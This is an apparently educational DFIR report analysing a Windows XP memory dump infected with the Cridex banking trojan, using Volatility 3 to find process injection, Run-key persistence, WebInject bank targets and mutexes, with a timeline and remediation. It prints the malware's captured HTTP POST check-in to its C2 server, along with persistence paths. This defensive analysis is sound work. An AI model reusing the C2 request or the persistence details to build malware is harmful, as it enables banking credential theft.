# Digital Forensics Incident Report: Windows Memory Compromise Walkthrough

| **Document Metadata** | **Value** |
|---|---|
| **Incident Case Reference** | IR-2026-CRIDEX-01 |
| **Investigation Title** | Memory & Endpoint Forensics Case Walkthrough |
| **Classification** | TLP:CLEAR (Authorized Educational Forensic Investigation) |
| **Target Host** | Host: `Robert-PC` (Windows XP Professional SP3 x86) |
| **Primary Investigator** | SOC Tier 1/2 Incident Response Analyst |
| **Date of Investigation** | 2026-10-27 |
| **Final Incident Verdict** | **Confirmed Compromise** |
| **Investigative Confidence** | **High** |

---

## 1. Executive Summary

A comprehensive digital forensics and incident response (DFIR) investigation was conducted on a physical memory dump (`cridex.vmem`, 512 MB) acquired from a suspected Windows workstation. The primary objective was to determine whether the endpoint had experienced an unauthorized compromise, reconstruct the chronological incident timeline, identify adversary persistence and Command-and-Control (C2) mechanisms, and provide actionable eradication and mitigation guidance.

The forensic analysis established unequivocal evidence of a **Confirmed Compromise** by the **Cridex (Feodo/Bugat) Banking Trojan**:
1. **Initial Execution**: At `2012-07-22 02:31:51 UTC`, an untrusted binary `C:\WINDOWS\cridex1.exe` was executed under the user profile `Robert` (recorded in UserAssist).
2. **Persistence Mechanism**: Concurrently at `2012-07-22 02:31:51 UTC`, an autostart registry entry was established in `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` disguised under the legitimate-sounding name `KB00207877.exe`, pointing to a dropped executable at `C:\Documents and Settings\Robert\Application Data\KB00207877.exe`.
3. **WebInject & Financial Targeting**: At `2012-07-22 02:33:06 UTC`, the malware staged an extensive encrypted/obfuscated WebInject configuration in `HKCU\Software\Microsoft\WSH\8149A9A8`, containing URL matching patterns for over 20 major retail and commercial banking portals.
4. **Process Injection**: Upon subsequent logon/startup, malicious executable code was injected into legitimate system and user processes: `explorer.exe` (PID 1484, VAD range `0x1460000-0x1480fff`) and `reader_sl.exe` (PID 1640, VAD range `0x3d0000-0x3f0fff`). Both processes exhibited `PAGE_EXECUTE_READWRITE` permissions, unbacked `MZ` headers, and identical injected shellcode stubs.
5. **Command & Control (C2)**: Injected processes established outbound HTTP POST communications to external IP `41.168.5.140` on port `8080` targeting URI `/zb/v_01_a/in/` to transmit encrypted 229-byte telemetry payloads.
6. **Kernel Synchronization Primitives**: Processes maintained open kernel handles to multiple Cridex-specific mutexes (`XMR8149A9A8`, `XMQ8149A9A8`, `XMS8149A9A8`, `XMM000005CC`, `XMM00000668`).

---

## 2. Case Background & Scope

### 2.1 Context
The investigated system belongs to user `Robert` and was flagged for anomalous outbound network behavior and unusual background activity. The evidence analyzed was obtained from the Volatility Foundation public forensic repository.

### 2.2 Scope & Objectives
- Verify evidence integrity and establish chain of custody using SHA-256 cryptographic hashing.
- Perform volatile memory forensics using Volatility 3.
- Enumerate running processes, parent-child process ancestry, and detect process injection or masquerading.
- Inspect kernel synchronization objects, handles, and loaded modules.
- Extract registry hives cached in memory to inspect persistence keys and user activity.
- Reconstruct the end-to-end incident timeline with UTC normalization.
- Map observed adversary techniques to the MITRE ATT&CK framework.
- Issue containment, eradication, and preventive hardening recommendations.

---

## 3. Evidence Inventory & Chain of Custody

All digital evidence was stored under `evidence/originals/` and marked read-only. Cryptographic verification was completed prior to examination:

| Evidence ID | Filename | Relative Path | File Size | Calculated SHA-256 Hash | Reference Hash | Integrity Status |
|---|---|---|---|---|---|---|
| **EV-01** | `cridex.vmem` | `originals/cridex.vmem` | 536,870,912 bytes (512 MB) | `02a63be2fcf3a63446c3c8ca9151aff963f888204d141e46c6be60ddde7c3e8d` | `02a63be2fcf3a63446c3c8ca9151aff963f888204d141e46c6be60ddde7c3e8d` | **MATCH (Verified with Source Reference)** |

Integrity calculations are permanently cataloged in `evidence/manifest.csv`.

---

## 4. Tools & Analysis Environment

Analysis was conducted on a local Windows 11 workstation using dedicated non-privileged tooling:
- **Operating System**: Windows 11 Home Single Language (64-bit), Build 26300
- **Python Runtime**: Python 3.12.2 (64-bit) within project virtual environment `.venv`
- **Volatility 3**: Version 2.28.2
  - Core libraries: `pefile==2024.8.26`, `capstone==5.0.9`, `pycryptodome==4.2.0`, `yara-python==4.5.4`
- **Version Control**: Git version 2.45.1.windows.1

---

## 5. Investigation Methodology

The investigation followed the **NIST SP 800-86** standard:
1. **Acquisition & Hashing**: Automated SHA-256 calculation via `scripts/calculate_hashes.py`.
2. **OS & Kernel Profile Resolution**: Execution of `windows.info` to identify kernel base, DTB, and automated symbol retrieval (`ntkrnlpa.pdb`).
3. **Process Hierarchy Enumeration**: Execution of `windows.pslist`, `windows.psscan`, and `windows.pstree`.
4. **Memory Injection Detection**: Execution of `windows.malfind` to flag unbacked `PAGE_EXECUTE_READWRITE` segments.
5. **Registry Hive Analysis**: Parsing `NTUSER.DAT` and `software` hives using `windows.registry.hivelist`, `windows.registry.printkey`, and `windows.registry.userassist`.
6. **Kernel Handles & Mutex Extraction**: Execution of `windows.handles` and `windows.mutantscan`.
7. **Network Buffer Inspection**: Memory byte streaming to extract HTTP headers and C2 communication parameters.
8. **Timeline & ATT&CK Correlation**: Synthesizing timestamps into `timeline/incident-timeline.csv` and mapping observables to ATT&CK tactics.

---

## 6. Memory Forensics Analysis (Volatility 3)

### 6.1 Operating System Identification (`windows.info`)
- **Kernel Base**: `0x804d7000` | **DTB**: `0x2fe000`
- **Operating System**: Windows XP Service Pack 3 (Build 2600.xpsp.080413-2111) x86
- **System Time (Capture Time)**: `2012-07-22 02:45:08 UTC`
- **System Root**: `C:\WINDOWS`
- *Artifact Reference*: `results/memory/windows_info.txt`

### 6.2 Process Hierarchy Analysis (`windows.pslist`, `windows.pstree`)
A total of 17 active processes were enumerated. No hidden processes were unlinked via DKOM (`psscan` yielded identical PIDs to `pslist`):
- `System` (PID 4) -> `smss.exe` (PID 368) -> `winlogon.exe` (PID 608) -> `services.exe` (PID 652), `lsass.exe` (PID 664)
- User desktop session: `explorer.exe` (PID 1484, PPID 1464, created `2012-07-22 02:42:36 UTC`)
- Spawned startup utility: `reader_sl.exe` (PID 1640, PPID 1484, created `2012-07-22 02:42:36 UTC`)
  - Command Line: `"C:\Program Files\Adobe\Reader 9.0\Reader\Reader_sl.exe"`
- *Artifact References*: `results/memory/windows_pslist.txt`, `results/memory/windows_pstree.txt`

### 6.3 Memory Injection & Process Hollowing (`windows.malfind`)
`windows.malfind` identified two distinct processes harboring injected code:
1. **`explorer.exe` (PID 1484)**:
   - Base Address: `0x1460000` - `0x1480fff` (Size: 135 KB)
   - Memory Protection: `PAGE_EXECUTE_READWRITE`
   - Content: Unbacked Portable Executable (`MZ header`, `4d 5a 90 00...`)
   - Initial Disassembly: `dec ebp; pop edx; nop; add byte ptr [ebx], al...`
2. **`reader_sl.exe` (PID 1640)**:
   - Base Address: `0x3d0000` - `0x3f0fff` (Size: 135 KB)
   - Memory Protection: `PAGE_EXECUTE_READWRITE`
   - Content: Unbacked Portable Executable (`MZ header`, `4d 5a 90 00...`)
   - Initial Disassembly: `dec ebp; pop edx; nop; add byte ptr [ebx], al...`
- *Finding*: Both processes contain identical injected PE stubs, confirming process hollowing/injection across multiple binaries.
- *Artifact Reference*: `results/memory/windows_malfind.txt`

### 6.4 Registry Persistence & Configuration Analysis
1. **User Run Key Persistence**:
   - Hive: `Robert\NTUSER.DAT` (`0xe1a19b60`)
   - Key: `Software\Microsoft\Windows\CurrentVersion\Run`
   - Value: `KB00207877.exe` -> `"C:\Documents and Settings\Robert\Application Data\KB00207877.exe"`
   - Last Write Time: `2012-07-22 02:31:51 UTC`
   - *Artifact Reference*: `results/memory/windows_runkey_user.txt`
2. **Cridex WebInject Target Database**:
   - Key: `Software\Microsoft\WSH\8149A9A8`
   - Last Write Time: `2012-07-22 02:33:06 UTC`
   - Data Type: `REG_BINARY` (473 KB)
   - Content: In-line URL patterns including `*treasurypathways.com*`, `*chase.com*`, `*bankofamerica.com*`, `*wellsfargo.com*`, `*pnc.com*`, `*suntrust.com*`, `*tdbank.com*`, `*schwab.com*`.
   - *Artifact Reference*: `results/memory/windows_wsh_subkeys.txt`
3. **UserAssist Execution Evidence**:
   - `C:\WINDOWS\cridex1.exe` executed at `2012-07-22 02:31:51 UTC` (Run count: 1)
   - `iexplore.exe` launched at `2012-07-22 02:31:28 UTC` immediately prior to infection.
   - *Artifact Reference*: `results/memory/windows_userassist.txt`

### 6.5 Kernel Synchronization & Mutex Artifacts (`windows.handles`, `windows.mutantscan`)
Inspection of process handles revealed active synchronization primitives characteristic of Cridex:
- Mutants: `XMR8149A9A8`, `XMQ8149A9A8`, `XMS8149A9A8`, `XMM000005CC`, `XMM00000668`
- Events: `B8149A9A8`, `XMF8149A9A8`, `XME000005CC`, `XME00000668`
- Registry Handles: Open handles to `SOFTWARE\MICROSOFT\WSH\8149A9A8` from both `explorer.exe` and `reader_sl.exe`.
- *Artifact References*: `results/memory/windows_handles_1484.txt`, `results/memory/windows_handles_1640.txt`, `results/memory/windows_mutantscan.txt`

### 6.6 Command & Control Network Telemetry
Direct inspection of memory network buffers extracted outbound HTTP POST requests:
```http
POST /zb/v_01_a/in/ HTTP/1.1
Accept: */*
User-Agent: Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)
Host: 41.168.5.140:8080
Content-Length: 229
Connection: Keep-Alive
Cache-Control: no-cache
```
- Remote C2 IP: **`41.168.5.140`**
- Remote Port: **`8080` (TCP)**
- URI Path: **`/zb/v_01_a/in/`**
- Payload: Encrypted binary telemetry check-in (229 bytes)

---

## 7. Endpoint Artifact Analysis Scope

Because the provided evidence consists solely of a physical RAM dump (`cridex.vmem`), file-system level endpoint artifacts requiring raw disk images (such as `$MFT`, Volume Shadow Copies, and full NTFS journal transaction records) were **out of scope**. However, endpoint registry hives (`NTUSER.DAT`, `SYSTEM`, `SOFTWARE`) and user interaction history (`UserAssist`) were extracted directly from volatile memory structures.

---

## 8. Chronological Incident Timeline

| Event ID | Timestamp (UTC) | Source Artifact | Process / Key | Description & Investigative Context |
|---|---|---|---|---|
| **EVT-006** | 2012-07-22 02:25:41 | UserAssist | `inetcpl.cpl` | Internet Options opened by user or script |
| **EVT-008** | 2012-07-22 02:26:19 | UserAssist | `firewall.cpl` | Windows Firewall control panel accessed |
| **EVT-009** | 2012-07-22 02:26:27 | UserAssist | `cmd.exe` | Interactive command prompt executed under Robert profile |
| **EVT-011** | 2012-07-22 02:31:28 | UserAssist | `iexplore.exe` | Internet Explorer executed, browsing preceding initial delivery |
| **EVT-012** | 2012-07-22 02:31:51 | UserAssist | `cridex1.exe` | **Initial compromise execution of Cridex dropper `C:\WINDOWS\cridex1.exe`** |
| **EVT-013** | 2012-07-22 02:31:51 | HKCU Run Key | `KB00207877.exe` | **Persistence installed pointing to `Application Data\KB00207877.exe`** |
| **EVT-014** | 2012-07-22 02:31:51 | HKCU Registry | `WSH\9DBBCFAD` | Cridex configuration key created in registry |
| **EVT-015** | 2012-07-22 02:33:06 | HKCU Registry | `WSH\8149A9A8` | WebInject URL matching targets written for >20 banking sites |
| **EVT-016** | 2012-07-22 02:42:31 | EPROCESS | `smss.exe` (PID 368) | Host system reboot / startup initiated |
| **EVT-017** | 2012-07-22 02:42:36 | EPROCESS | `explorer.exe` (PID 1484) | Interactive user shell starts under Robert profile |
| **EVT-018** | 2012-07-22 02:42:36 | EPROCESS | `reader_sl.exe` (PID 1640) | Adobe Reader Speed Launcher spawned from HKLM Run key |
| **EVT-019** | 2012-07-22 02:42:36 | Process VAD | `explorer.exe` (PID 1484) | **Process hollowing / injection of unbacked PE into `explorer.exe`** |
| **EVT-020** | 2012-07-22 02:42:36 | Process VAD | `reader_sl.exe` (PID 1640) | **Process hollowing / injection of unbacked PE into `reader_sl.exe`** |
| **EVT-021** | 2012-07-22 02:42:36 | Kernel Handles | `reader_sl.exe` / `explorer.exe` | Mutexes `XMR8149A9A8`, `XMQ8149A9A8` created; registry handles opened |
| **EVT-023** | 2012-07-22 02:43:00 | Network Buffer | `explorer.exe` / `reader_sl.exe` | **HTTP POST C2 check-in transmitted to `41.168.5.140:8080`** |
| **EVT-024** | 2012-07-22 02:45:08 | Kernel Time | Memory Snapshot | Physical memory dump acquired |

Full details are cataloged in `timeline/incident-timeline.csv`.

---

## 9. Attack Chain & MITRE ATT&CK Mapping

```
[Initial Access / Execution]  ──>  [Persistence]            ──>  [Defense Evasion]         ──>  [Command & Control]
C:\WINDOWS\cridex1.exe             HKCU Run: KB00207877.exe      Process Injection (T1055)      POST /zb/v_01_a/in/
(T1204.002)                        (T1547.001)                   explorer.exe & reader_sl       to 41.168.5.140:8080
                                                                 (T1036.005 Masquerading)       (T1071.001)
                                                                            │
                                                                            ▼
                                                                 [Collection / Credential]
                                                                 WebInjects for 20+ Banks
                                                                 (T1185 Man-in-the-Browser)
```

| Tactic | ATT&CK Technique ID | Technique Name | Observed Evidence & Forensic Artifact |
|---|---|---|---|
| **Execution** | **T1204.002** | User Execution: Malicious File | User execution of `C:\WINDOWS\cridex1.exe` logged in UserAssist at 02:31:51 UTC. |
| **Persistence** | **T1547.001** | Registry Run Keys / Startup Folder | Autostart value `KB00207877.exe` created in `HKCU\...\CurrentVersion\Run`. |
| **Defense Evasion** | **T1036.005** | Masquerading: Match Legitimate Name | Payload names `KB00207877.exe` imitating Microsoft KB update naming convention. |
| **Defense Evasion** | **T1055** | Process Injection | Unbacked PE headers with `PAGE_EXECUTE_READWRITE` injected into `explorer.exe` (0x1460000) and `reader_sl.exe` (0x3d0000). |
| **Command and Control** | **T1071.001** | Application Layer Protocol: Web Protocols | Outbound HTTP POST traffic on non-standard port 8080 to `41.168.5.140:8080`. |
| **Collection** | **T1185** | Man-in-the-Browser | Binary configuration under `HKCU\Software\Microsoft\WSH\8149A9A8` intercepting web sessions for banking portals. |

---

## 10. Indicators of Compromise (IoCs)

### 10.1 Network Indicators
- **C2 IP Address**: `41.168.5.140`
- **C2 Port**: `8080` (TCP)
- **C2 URI**: `/zb/v_01_a/in/`
- **HTTP User-Agent**: `Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)`

### 10.2 Host & File Indicators
- **Dropper Path**: `C:\WINDOWS\cridex1.exe`
- **Persistent Payload Path**: `C:\Documents and Settings\Robert\Application Data\KB00207877.exe`
- **Injected Memory Regions**:
  - `explorer.exe` (PID 1484) -> Base `0x1460000`, Size 135,168 bytes
  - `reader_sl.exe` (PID 1640) -> Base `0x3d0000`, Size 135,168 bytes

### 10.3 Registry Indicators
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\KB00207877.exe`
- `HKCU\Software\Microsoft\WSH\8149A9A8`
- `HKCU\Software\Microsoft\WSH\9DBBCFAD`

### 10.4 Mutex & Event Synchronization Indicators
- Mutants: `XMR8149A9A8`, `XMQ8149A9A8`, `XMS8149A9A8`, `XMM000005CC`, `XMM00000668`, `0CADFD67AF62496dB34264F000F5624A`
- Events: `B8149A9A8`, `XMF8149A9A8`, `XME000005CC`, `XME00000668`

---

## 11. Incident Verdict & Confidence

- **Final Verdict**: **Confirmed compromise**
- **Confidence Rating**: **High**
- **Analytical Basis**: The verdict is supported by multiple independent, mutually corroborating forensic artifacts: verified initial execution timestamp in UserAssist, registry persistence entries, in-memory process hollowing with unbacked executable code, distinct malware mutexes, staged WebInject configuration, and outbound C2 HTTP network traffic.

---

## 12. Potential Impact Assessment

1. **Confidentiality**: High. Banking credentials, authentication session tokens, and financial account numbers for visited banking portals are targeted by the staged WebInject modules.
2. **Integrity**: High. The malware injects arbitrary code into core system processes (`explorer.exe`) and alters system startup configurations.
3. **Availability**: Low to Moderate. System remained operational, but endpoint control is compromised.

---

## 13. Remediation & Strategic Recommendations

### 13.1 Immediate Containment (Within 1 Hour)
1. **Network Isolation**: Immediately disconnect the affected workstation from the local network segment.
2. **Perimeter Firewall Block**: Implement an immediate egress block on IP `41.168.5.140` and TCP port `8080`.
3. **Session Revocation**: Force reset of all corporate and personal passwords, bank logins, and authentication tokens accessed from this machine.

### 13.2 Eradication & Recovery
1. **Host Re-imaging**: Because code injection occurred into core operating system binaries and persistence was established across user registry hives, complete wiping and re-imaging of the workstation from a known-good master image is strongly recommended over manual cleanup.
2. **Manual Cleanup (if forensic testing requires)**:
   - Terminate PIDs 1484 and 1640.
   - Delete files: `C:\WINDOWS\cridex1.exe` and `C:\Documents and Settings\Robert\Application Data\KB00207877.exe`.
   - Remove registry value `KB00207877.exe` from `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`.
   - Remove registry key `HKCU\Software\Microsoft\WSH`.

### 13.3 Preventive Hardening
1. **Endpoint Detection and Response (EDR)**: Deploy behavioral EDR agents configured to detect and block process hollowing, unbacked RWX memory allocations, and suspicious registry Run key modifications.
2. **Application Control / AppLocker**: Enforce software restriction policies prohibiting executables from running directly out of user-writable directories (`%APPDATA%`, `%TEMP%`).
3. **Web Filtering & Proxy**: Implement egress filtering to block HTTP traffic over non-standard high ports (e.g., port 8080 to foreign IP addresses).
4. **Operating System Upgrades**: Decommission outdated, end-of-life operating systems (Windows XP) lacking modern memory protections (DEP, ASLR, CFG).

---

## 14. Evidence Limitations

1. **Snapshot Ephemerality**: Physical memory reflects a point-in-time state (`2012-07-22 02:45:08 UTC`). Network connections closed significantly prior to capture could not be enumerated through live socket tables.
2. **Non-Volatile Disk Triage**: Raw NTFS filesystem artifacts ($MFT, Prefetch, Volume Shadow Copies) were not part of the provided training dataset. Findings were derived entirely from memory structures and memory-resident registry hives.

---

## 15. Appendix: Command Log & Result Artifact References

All analysis commands were executed using the dedicated virtual environment `.venv` and generated reproducible raw outputs:

| Tool & Command | Purpose | Output File Reference |
|---|---|---|
| `vol.exe -f evidence/originals/cridex.vmem windows.info` | Kernel profile & time resolution | `results/memory/windows_info.txt` |
| `vol.exe -f evidence/originals/cridex.vmem windows.pslist` | Process listing enumeration | `results/memory/windows_pslist.txt` |
| `vol.exe -f evidence/originals/cridex.vmem windows.psscan` | Physical pool process scanning | `results/memory/windows_psscan.txt` |
| `vol.exe -f evidence/originals/cridex.vmem windows.pstree` | Hierarchical process tree analysis | `results/memory/windows_pstree.txt` |
| `vol.exe -f evidence/originals/cridex.vmem windows.cmdline` | Command-line argument extraction | `results/memory/windows_cmdline.txt` |
| `vol.exe -f evidence/originals/cridex.vmem windows.malfind` | RWX / Injected PE detection | `results/memory/windows_malfind.txt` |
| `vol.exe -f evidence/originals/cridex.vmem windows.registry.hivelist` | Enumerate memory-resident registry hives | `results/memory/windows_hivelist.txt` |
| `vol.exe -f evidence/originals/cridex.vmem windows.registry.printkey` | Inspect user & machine Run keys | `results/memory/windows_runkey_user.txt` |
| `vol.exe -f evidence/originals/cridex.vmem windows.registry.userassist` | Extract GUI application execution history | `results/memory/windows_userassist.txt` |
| `vol.exe -f evidence/originals/cridex.vmem windows.mutantscan` | Enumerate active named mutexes | `results/memory/windows_mutantscan.txt` |
| `vol.exe -f evidence/originals/cridex.vmem windows.handles` | Enumerate process handle tables | `results/memory/windows_handles_1484.txt` |
